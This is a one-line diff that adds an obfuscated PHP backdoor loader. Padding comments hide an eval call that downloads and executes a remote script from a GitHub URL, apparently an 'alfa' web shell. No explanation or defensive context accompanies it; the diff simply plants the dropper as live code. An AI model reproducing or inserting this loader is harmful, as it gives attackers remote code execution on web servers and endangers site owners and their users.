@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode("https://raw.githubusercontent.com/SukaJanda01/alfa/refs/heads/main/bypfm.php"))));/**/?>
